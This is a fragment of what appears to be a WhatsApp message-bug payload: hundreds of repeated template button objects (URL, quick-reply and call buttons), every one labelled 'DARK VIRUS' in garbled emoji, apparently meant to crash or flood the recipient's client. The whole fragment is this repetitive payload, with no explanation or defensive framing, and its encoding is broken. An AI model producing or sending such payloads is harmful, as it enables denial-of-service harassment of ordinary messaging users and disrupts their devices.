{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
   { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
  { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
   { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
  { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
   { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
  { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
